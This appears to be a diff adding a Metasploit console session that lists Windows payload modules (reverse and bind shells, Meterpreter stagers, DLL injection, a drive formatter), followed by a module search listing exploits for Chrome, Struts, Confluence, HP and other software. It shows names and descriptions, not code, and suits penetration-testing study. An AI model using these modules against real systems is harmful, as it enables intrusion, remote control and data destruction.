+   33   payload/windows/dllinject/bind_hidden_ipknock_tcp           .                normal  No     Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
+   34   payload/windows/dllinject/bind_hidden_tcp                   .                normal  No     Reflective DLL Injection, Hidden Bind TCP Stager
+   35   payload/windows/dllinject/bind_ipv6_tcp                     .                normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
+   36   payload/windows/dllinject/bind_ipv6_tcp_uuid                .                normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   37   payload/windows/dllinject/bind_named_pipe                   .                normal  No     Reflective DLL Injection, Windows x86 Bind Named Pipe Stager
+   38   payload/windows/dllinject/bind_nonx_tcp                     .                normal  No     Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
+   39   payload/windows/dllinject/bind_tcp                          .                normal  No     Reflective DLL Injection, Bind TCP Stager (Windows x86)
+   40   payload/windows/dllinject/bind_tcp_rc4                      .                normal  No     Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   41   payload/windows/dllinject/bind_tcp_uuid                     .                normal  No     Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
+   42   payload/windows/dllinject/reverse_http                      .                normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
+   43   payload/windows/dllinject/reverse_http_proxy_pstore         .                normal  No     Reflective DLL Injection, Reverse HTTP Stager Proxy
+   44   payload/windows/dllinject/reverse_ipv6_tcp                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager (IPv6)
+   45   payload/windows/dllinject/reverse_nonx_tcp                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
+   46   payload/windows/dllinject/reverse_ord_tcp                   .                normal  No     Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
+   47   payload/windows/dllinject/reverse_tcp                       .                normal  No     Reflective DLL Injection, Reverse TCP Stager
+   48   payload/windows/dllinject/reverse_tcp_allports              .                normal  No     Reflective DLL Injection, Reverse All-Port TCP Stager
+   49   payload/windows/dllinject/reverse_tcp_dns                   .                normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)
+   50   payload/windows/dllinject/reverse_tcp_rc4                   .                normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   51   payload/windows/dllinject/reverse_tcp_rc4_dns               .                normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   52   payload/windows/dllinject/reverse_tcp_uuid                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager with UUID Support
+   53   payload/windows/dllinject/reverse_winhttp                   .                normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)
+   54   payload/windows/dns_txt_query_exec                          .                normal  No     DNS TXT Record Payload Download and Execution
+   55   payload/windows/download_exec                               .                normal  No     Windows Executable Download (http,https,ftp) and Execute
+   56   payload/windows/exec                                        .                normal  No     Windows Execute Command
+   57   payload/windows/format_all_drives                           .                manual  No     Windows Drive Formatter
+   58   payload/windows/loadlibrary                                 .                normal  No     Windows LoadLibrary Path
+   59   payload/windows/messagebox                                  .                normal  No     Windows MessageBox
+   60   payload/windows/meterpreter/bind_hidden_ipknock_tcp         .                normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   61   payload/windows/meterpreter/bind_hidden_tcp                 .                normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
+   62   payload/windows/meterpreter/bind_ipv6_tcp                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   63   payload/windows/meterpreter/bind_ipv6_tcp_uuid              .                normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   64   payload/windows/meterpreter/bind_named_pipe                 .                normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   65   payload/windows/meterpreter/bind_nonx_tcp                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   66   payload/windows/meterpreter/bind_tcp                        .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
+   67   payload/windows/meterpreter/bind_tcp_rc4                    .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   68   payload/windows/meterpreter/bind_tcp_uuid                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   69   payload/windows/meterpreter/reverse_http                    .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   70   payload/windows/meterpreter/reverse_http_proxy_pstore       .                normal  No     Windows Meterpreter (Reflective Injection), Reverse HTTP Stager Proxy
+   71   payload/windows/meterpreter/reverse_https                   .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+   72   payload/windows/meterpreter/reverse_ipv6_tcp                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
+   73   payload/windows/meterpreter/reverse_named_pipe              .                normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
+   74   payload/windows/meterpreter/reverse_nonx_tcp                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   75   payload/windows/meterpreter/reverse_ord_tcp                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   76   payload/windows/meterpreter/reverse_tcp                     .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+   77   payload/windows/meterpreter/reverse_tcp_allports            .                normal  No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
+   78   payload/windows/meterpreter/reverse_tcp_dns                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
+   79   payload/windows/meterpreter/reverse_tcp_rc4                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   80   payload/windows/meterpreter/reverse_tcp_rc4_dns             .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   81   payload/windows/meterpreter/reverse_tcp_uuid                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
+   82   payload/windows/meterpreter/reverse_winhttp                 .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+   83   payload/windows/meterpreter/reverse_winhttps                .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
+   84   payload/windows/metsvc_bind_tcp                             .                normal  No     Windows Meterpreter Service, Bind TCP
+   85   payload/windows/metsvc_reverse_tcp                          .                normal  No     Windows Meterpreter Service, Reverse TCP Inline
+   86   payload/windows/patchupdllinject/bind_hidden_ipknock_tcp    .                normal  No     Windows Inject DLL, Hidden Bind Ipknock TCP Stager
+   87   payload/windows/patchupdllinject/bind_hidden_tcp            .                normal  No     Windows Inject DLL, Hidden Bind TCP Stager
+   88   payload/windows/patchupdllinject/bind_ipv6_tcp              .                normal  No     Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
+   89   payload/windows/patchupdllinject/bind_ipv6_tcp_uuid         .                normal  No     Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   90   payload/windows/patchupdllinject/bind_named_pipe            .                normal  No     Windows Inject DLL, Windows x86 Bind Named Pipe Stager
+   91   payload/windows/patchupdllinject/bind_nonx_tcp              .                normal  No     Windows Inject DLL, Bind TCP Stager (No NX or Win7)
+   92   payload/windows/patchupdllinject/bind_tcp                   .                normal  No     Windows Inject DLL, Bind TCP Stager (Windows x86)
+   93   payload/windows/patchupdllinject/bind_tcp_rc4               .                normal  No     Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   94   payload/windows/patchupdllinject/bind_tcp_uuid              .                normal  No     Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
+   95   payload/windows/patchupdllinject/reverse_ipv6_tcp           .                normal  No     Windows Inject DLL, Reverse TCP Stager (IPv6)
+   96   payload/windows/patchupdllinject/reverse_nonx_tcp           .                normal  No     Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
+   97   payload/windows/patchupdllinject/reverse_ord_tcp            .                normal  No     Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
+   98   payload/windows/patchupdllinject/reverse_tcp                .                normal  No     Windows Inject DLL, Reverse TCP Stager
+   99   payload/windows/patchupdllinject/reverse_tcp_allports       .                normal  No     Windows Inject DLL, Reverse All-Port TCP Stager
+   100  payload/windows/patchupdllinject/reverse_tcp_dns            .                normal  No     Windows Inject DLL, Reverse TCP Stager (DNS)
+   101  payload/windows/patchupdllinject/reverse_tcp_rc4            .                normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   102  payload/windows/patchupdllinject/reverse_tcp_rc4_dns        .                normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   103  payload/windows/patchupdllinject/reverse_tcp_uuid           .                normal  No     Windows Inject DLL, Reverse TCP Stager with UUID Support
+   104  payload/windows/patchupmeterpreter/bind_hidden_ipknock_tcp  .                normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
+   105  payload/windows/patchupmeterpreter/bind_hidden_tcp          .                normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
+   106  payload/windows/patchupmeterpreter/bind_ipv6_tcp            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
+   107  payload/windows/patchupmeterpreter/bind_ipv6_tcp_uuid       .                normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   108  payload/windows/patchupmeterpreter/bind_named_pipe          .                normal  No     Windows Meterpreter (skape/jt Injection), Windows x86 Bind Named Pipe Stager
+   109  payload/windows/patchupmeterpreter/bind_nonx_tcp            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
+   110  payload/windows/patchupmeterpreter/bind_tcp                 .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
+   111  payload/windows/patchupmeterpreter/bind_tcp_rc4             .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   112  payload/windows/patchupmeterpreter/bind_tcp_uuid            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
+   113  payload/windows/patchupmeterpreter/reverse_ipv6_tcp         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
+   114  payload/windows/patchupmeterpreter/reverse_nonx_tcp         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
+   115  payload/windows/patchupmeterpreter/reverse_ord_tcp          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   116  payload/windows/patchupmeterpreter/reverse_tcp              .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
+   117  payload/windows/patchupmeterpreter/reverse_tcp_allports     .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
+   118  payload/windows/patchupmeterpreter/reverse_tcp_dns          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
+   119  payload/windows/patchupmeterpreter/reverse_tcp_rc4          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   120  payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns      .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   121  payload/windows/patchupmeterpreter/reverse_tcp_uuid         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
+   122  payload/windows/peinject/bind_hidden_ipknock_tcp            .                normal  No     Windows Inject PE Files, Hidden Bind Ipknock TCP Stager
+   123  payload/windows/peinject/bind_hidden_tcp                    .                normal  No     Windows Inject PE Files, Hidden Bind TCP Stager
+   124  payload/windows/peinject/bind_ipv6_tcp                      .                normal  No     Windows Inject PE Files, Bind IPv6 TCP Stager (Windows x86)
+   125  payload/windows/peinject/bind_ipv6_tcp_uuid                 .                normal  No     Windows Inject PE Files, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   126  payload/windows/peinject/bind_named_pipe                    .                normal  No     Windows Inject PE Files, Windows x86 Bind Named Pipe Stager
+   127  payload/windows/peinject/bind_nonx_tcp                      .                normal  No     Windows Inject PE Files, Bind TCP Stager (No NX or Win7)
+   128  payload/windows/peinject/bind_tcp                           .                normal  No     Windows Inject PE Files, Bind TCP Stager (Windows x86)
+   129  payload/windows/peinject/bind_tcp_rc4                       .                normal  No     Windows Inject PE Files, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   130  payload/windows/peinject/bind_tcp_uuid                      .                normal  No     Windows Inject PE Files, Bind TCP Stager with UUID Support (Windows x86)
+   131  payload/windows/peinject/reverse_ipv6_tcp                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager (IPv6)
+   132  payload/windows/peinject/reverse_named_pipe                 .                normal  No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager
+   133  payload/windows/peinject/reverse_nonx_tcp                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager (No NX or Win7)
+   134  payload/windows/peinject/reverse_ord_tcp                    .                normal  No     Windows Inject PE Files, Reverse Ordinal TCP Stager (No NX or Win7)
+   135  payload/windows/peinject/reverse_tcp                        .                normal  No     Windows Inject PE Files, Reverse TCP Stager
+   136  payload/windows/peinject/reverse_tcp_allports               .                normal  No     Windows Inject PE Files, Reverse All-Port TCP Stager
+   137  payload/windows/peinject/reverse_tcp_dns                    .                normal  No     Windows Inject PE Files, Reverse TCP Stager (DNS)
+   138  payload/windows/peinject/reverse_tcp_rc4                    .                normal  No     Windows Inject PE Files, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   139  payload/windows/peinject/reverse_tcp_rc4_dns                .                normal  No     Windows Inject PE Files, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   140  payload/windows/peinject/reverse_tcp_uuid                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager with UUID Support
+   141  payload/windows/pingback_bind_tcp                           .                normal  No     Windows x86 Pingback, Bind TCP Inline
+   142  payload/windows/pingback_reverse_tcp                        .                normal  No     Windows x86 Pingback, Reverse TCP Inline
+   143  payload/windows/powershell_bind_tcp                         .                normal  No     Windows Interactive Powershell Session, Bind TCP
+   144  payload/windows/powershell_reverse_tcp                      .                normal  No     Windows Interactive Powershell Session, Reverse TCP
+   145  payload/windows/powershell_reverse_tcp_ssl                  .                normal  No     Windows Interactive Powershell Session, Reverse TCP SSL
+   146  payload/windows/shell/bind_hidden_ipknock_tcp               .                normal  No     Windows Command Shell, Hidden Bind Ipknock TCP Stager
+   147  payload/windows/shell/bind_hidden_tcp                       .                normal  No     Windows Command Shell, Hidden Bind TCP Stager
+   148  payload/windows/shell/bind_ipv6_tcp                         .                normal  No     Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
+   149  payload/windows/shell/bind_ipv6_tcp_uuid                    .                normal  No     Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   150  payload/windows/shell/bind_named_pipe                       .                normal  No     Windows Command Shell, Windows x86 Bind Named Pipe Stager
+   151  payload/windows/shell/bind_nonx_tcp                         .                normal  No     Windows Command Shell, Bind TCP Stager (No NX or Win7)
+   152  payload/windows/shell/bind_tcp                              .                normal  No     Windows Command Shell, Bind TCP Stager (Windows x86)
+   153  payload/windows/shell/bind_tcp_rc4                          .                normal  No     Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   154  payload/windows/shell/bind_tcp_uuid                         .                normal  No     Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
+   155  payload/windows/shell/reverse_ipv6_tcp                      .                normal  No     Windows Command Shell, Reverse TCP Stager (IPv6)
+   156  payload/windows/shell/reverse_nonx_tcp                      .                normal  No     Windows Command Shell, Reverse TCP Stager (No NX or Win7)
+   157  payload/windows/shell/reverse_ord_tcp                       .                normal  No     Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
+   158  payload/windows/shell/reverse_tcp                           .                normal  No     Windows Command Shell, Reverse TCP Stager
+   159  payload/windows/shell/reverse_tcp_allports                  .                normal  No     Windows Command Shell, Reverse All-Port TCP Stager
+   160  payload/windows/shell/reverse_tcp_dns                       .                normal  No     Windows Command Shell, Reverse TCP Stager (DNS)
+   161  payload/windows/shell/reverse_tcp_rc4                       .                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   162  payload/windows/shell/reverse_tcp_rc4_dns                   .                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   163  payload/windows/shell/reverse_tcp_uuid                      .                normal  No     Windows Command Shell, Reverse TCP Stager with UUID Support
+   164  payload/windows/shell/reverse_udp                           .                normal  No     Windows Command Shell, Reverse UDP Stager with UUID Support
+   165  payload/windows/shell_bind_tcp                              .                normal  No     Windows Command Shell, Bind TCP Inline
+   166  payload/windows/shell_bind_tcp_xpfw                         .                normal  No     Windows Disable Windows ICF, Command Shell, Bind TCP Inline
+   167  payload/windows/shell_hidden_bind_tcp                       .                normal  No     Windows Command Shell, Hidden Bind TCP Inline
+   168  payload/windows/shell_reverse_tcp                           .                normal  No     Windows Command Shell, Reverse TCP Inline
+   169  payload/windows/speak_pwned                                 .                normal  No     Windows Speech API - Say "You Got Pwned!"
+   170  payload/windows/upexec/bind_hidden_ipknock_tcp              .                normal  No     Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
+   171  payload/windows/upexec/bind_hidden_tcp                      .                normal  No     Windows Upload/Execute, Hidden Bind TCP Stager
+   172  payload/windows/upexec/bind_ipv6_tcp                        .                normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
+   173  payload/windows/upexec/bind_ipv6_tcp_uuid                   .                normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   174  payload/windows/upexec/bind_named_pipe                      .                normal  No     Windows Upload/Execute, Windows x86 Bind Named Pipe Stager
+   175  payload/windows/upexec/bind_nonx_tcp                        .                normal  No     Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
+   176  payload/windows/upexec/bind_tcp                             .                normal  No     Windows Upload/Execute, Bind TCP Stager (Windows x86)
+   177  payload/windows/upexec/bind_tcp_rc4                         .                normal  No     Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   178  payload/windows/upexec/bind_tcp_uuid                        .                normal  No     Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
+   179  payload/windows/upexec/reverse_ipv6_tcp                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager (IPv6)
+   180  payload/windows/upexec/reverse_nonx_tcp                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
+   181  payload/windows/upexec/reverse_ord_tcp                      .                normal  No     Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
+   182  payload/windows/upexec/reverse_tcp                          .                normal  No     Windows Upload/Execute, Reverse TCP Stager
+   183  payload/windows/upexec/reverse_tcp_allports                 .                normal  No     Windows Upload/Execute, Reverse All-Port TCP Stager
+   184  payload/windows/upexec/reverse_tcp_dns                      .                normal  No     Windows Upload/Execute, Reverse TCP Stager (DNS)
+   185  payload/windows/upexec/reverse_tcp_rc4                      .                normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   186  payload/windows/upexec/reverse_tcp_rc4_dns                  .                normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   187  payload/windows/upexec/reverse_tcp_uuid                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager with UUID Support
+   188  payload/windows/upexec/reverse_udp                          .                normal  No     Windows Upload/Execute, Reverse UDP Stager with UUID Support
+   189  payload/windows/vncinject/bind_hidden_ipknock_tcp           .                normal  No     VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   190  payload/windows/vncinject/bind_hidden_tcp                   .                normal  No     VNC Server (Reflective Injection), Hidden Bind TCP Stager
+   191  payload/windows/vncinject/bind_ipv6_tcp                     .                normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   192  payload/windows/vncinject/bind_ipv6_tcp_uuid                .                normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   193  payload/windows/vncinject/bind_named_pipe                   .                normal  No     VNC Server (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   194  payload/windows/vncinject/bind_nonx_tcp                     .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   195  payload/windows/vncinject/bind_tcp                          .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
+   196  payload/windows/vncinject/bind_tcp_rc4                      .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   197  payload/windows/vncinject/bind_tcp_uuid                     .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   198  payload/windows/vncinject/reverse_http                      .                normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   199  payload/windows/vncinject/reverse_http_proxy_pstore         .                normal  No     VNC Server (Reflective Injection), Reverse HTTP Stager Proxy
+   200  payload/windows/vncinject/reverse_ipv6_tcp                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
+   201  payload/windows/vncinject/reverse_nonx_tcp                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   202  payload/windows/vncinject/reverse_ord_tcp                   .                normal  No     VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   203  payload/windows/vncinject/reverse_tcp                       .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager
+   204  payload/windows/vncinject/reverse_tcp_allports              .                normal  No     VNC Server (Reflective Injection), Reverse All-Port TCP Stager
+   205  payload/windows/vncinject/reverse_tcp_dns                   .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
+   206  payload/windows/vncinject/reverse_tcp_rc4                   .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   207  payload/windows/vncinject/reverse_tcp_rc4_dns               .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   208  payload/windows/vncinject/reverse_tcp_uuid                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
+   209  payload/windows/vncinject/reverse_winhttp                   .                normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> use 66
+[-] Invalid module index: 66
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> use payload 66
+
+Matching Modules
+================
+
+   #    Name                                                                                                 Disclosure Date  Rank       Check  Description
+   -    ----                                                                                                 ---------------  ----       -----  -----------
+   0    exploit/windows/scada/igss9_misc                                                                     2011-03-24       excellent  No     7-Technologies IGSS 9 Data Server/Collector Packet Handling Vulnerabilities
+   1      \_ target: Automatic                                                                               .                .          .      .
+   2      \_ target: Windows XP                                                                              .                .          .      .
+   3      \_ target: Windows 7                                                                               .                .          .      .
+   4      \_ target: Windows Server 2003 / R2                                                                .                .          .      .
+   5    exploit/windows/fileformat/adobe_pdf_embedded_exe                                                    2010-03-29       excellent  No     Adobe PDF Embedded EXE Social Engineering
+   6    exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs                                               2010-03-29       excellent  No     Adobe PDF Escape EXE Social Engineering (No JavaScript)
+   7    exploit/multi/http/struts_include_params                                                             2013-05-24       great      Yes    Apache Struts includeParams Remote Code Execution
+   8      \_ target: Windows Universal                                                                       .                .          .      .
+   9      \_ target: Linux Universal                                                                         .                .          .      .
+   10     \_ target: Java Universal                                                                          .                .          .      .
+   11   exploit/multi/http/confluence_widget_connector                                                       2019-03-25       excellent  Yes    Atlassian Confluence Widget Connector Macro Velocity Template Injection
+   12     \_ target: Java                                                                                    .                .          .      .
+   13     \_ target: Windows                                                                                 .                .          .      .
+   14     \_ target: Linux                                                                                   .                .          .      .
+   15   exploit/multi/http/jira_hipchat_template                                                             2015-10-28       excellent  Yes    Atlassian HipChat for Jira Plugin Velocity Template Injection
+   16     \_ target: HipChat for Jira plugin on Java                                                         .                .          .      .
+   17     \_ target: HipChat for Jira plugin on Windows                                                      .                .          .      .
+   18     \_ target: HipChat for Jira plugin on Linux                                                        .                .          .      .
+   19   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move                                         2020-03-10       excellent  Yes    Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability
+   20   exploit/multi/http/bitbucket_env_var_rce                                                             2022-11-16       excellent  Yes    Bitbucket Environment Variable RCE
+   21     \_ target: Linux Command                                                                           .                .          .      .
+   22     \_ target: Linux Dropper                                                                           .                .          .      .
+   23     \_ target: Windows Dropper                                                                         .                .          .      .
+   24   auxiliary/admin/networking/cisco_asa_extrabacon                                                      .                normal     Yes    Cisco ASA Authentication Bypass (EXTRABACON)
+   25     \_ action: PASS_DISABLE                                                                            .                .          .      Disable password authentication.
+   26     \_ action: PASS_ENABLE                                                                             .                .          .      Enable password authentication.
+   27   exploit/windows/http/ezserver_http                                                                   2012-06-18       excellent  No     EZHomeTech EzServer Stack Buffer Overflow Vulnerability
+   28   exploit/windows/http/easyftp_list                                                                    2010-02-18       great      Yes    EasyFTP Server list.html path Stack Buffer Overflow
+   29   exploit/multi/fileformat/evince_cbt_cmd_injection                                                    2017-07-13       excellent  No     Evince CBT File Command Injection
+   30   exploit/multi/browser/chrome_simplifiedlowering_overflow                                             2020-11-19       manual     No     Google Chrome versions before 87.0.4280.88 integer overflow during SimplfiedLowering phase
+   31     \_ target: Linux - Google Chrome 87.0.4280.66 (64 bit)                                             .                .          .      .
+   32     \_ target: Windows 10 - Google Chrome 87.0.4280.66 (64 bit)                                        .                .          .      .
+   33     \_ target: macOS - Google Chrome 87.0.4280.66 (64 bit)                                             .                .          .      .
+   34   exploit/multi/browser/chrome_cve_2021_21220_v8_insufficient_validation                               2021-04-13       manual     No     Google Chrome versions before 89.0.4389.128 V8 XOR Typer Out-Of-Bounds Access RCE
+   35     \_ target: Linux - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)                             .                .          .      .
+   36     \_ target: Windows 10 - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)                        .                .          .      .
+   37     \_ target: macOS - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)                             .                .          .      .
+   38   exploit/multi/http/grav_twig_ssti_sandbox_bypass_rce                                                 2025-12-01       excellent  Yes    Grav CMS Twig SSTI Authenticated Sandbox Bypass RCE
+   39     \_ target: Unix/Linux Command Shell                                                                .                .          .      .
+   40     \_ target: Windows Command Shell                                                                   .                .          .      .
+   41   exploit/windows/http/hp_autopass_license_traversal                                                   2014-01-10       great      Yes    HP AutoPass License Server File Upload
+   42     \_ target: Windows 2003 SP2 / HP AutoPass License Server 8.01 / HP Service Virtualization 3.50     .                .          .      .
+   43     \_ target: Windows 2008 32 bits/ HP AutoPass License Server 8.01 / HP Service Virtualization 3.50  .                .          .      .
+   44     \_ target: Windows 2008 64 bits/ HP AutoPass License Server 8.01 / HP Service Virtualization 3.50  .                .          .      .
+   45     \_ target: Windows 2012 / HP AutoPass License Server 8.01 / HP Service Virtualization 3.50         .                .          .      .
+   46   exploit/windows/misc/hp_dataprotector_cmd_exec                                                       2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution
+   47   exploit/windows/browser/hp_loadrunner_writefilestring                                                2013-07-24       normal     No     HP LoadRunner lrFileIOService ActiveX WriteFileString Remote Code Execution
+   48   exploit/windows/http/hp_mpa_job_acct                                                                 2011-12-21       excellent  Yes    HP Managed Printing Administration jobAcct Remote Command Execution
+   49   exploit/windows/http/icecast_header                                                                  2004-09-28       great      No     Icecast Header Overwrite
+   50   exploit/multi/browser/java_atomicreferencearray                                                      2012-02-14       excellent  No     Java AtomicReferenceArray Type Violation Vulnerability
+   51     \_ target: Generic (Java Payload)                                                                  .                .          .      .
+   52     \_ target: Windows x86 (Native Payload)                                                            .                .          .      .
+   53     \_ target: Mac OS X PPC (Native Payload)                                                           .                .          .      .
+   54     \_ target: Mac OS X x86 (Native Payload)                                                           .                .          .      .
+   55     \_ target: Linux x86 (Native Payload)                                                              .                .          .      .
+   56   exploit/multi/misc/java_jdwp_debugger                                                                2010-03-12       good       Yes    Java Debug Wire Protocol Remote Code Execution
+   57     \_ target: Linux (Native Payload)                                                                  .                .          .      .
+   58     \_ target: OSX (Native Payload)                                                                    .                .          .      .
+   59     \_ target: Windows (Native Payload)                                                                .                .          .      .
+   60   exploit/windows/local/ms13_005_hwnd_broadcast                                                        2012-11-27       excellent  No     MS13-005 HWND_BROADCAST Low to Medium Integrity Privilege Escalation
+   61     \_ target: Windows x86                                                                             .                .          .      .
+   62     \_ target: Windows x64                                                                             .                .          .      .
+   63   exploit/multi/http/git_submodule_url_exec                                                            2018-10-05       excellent  No     Malicious Git HTTP Server For CVE-2018-17456
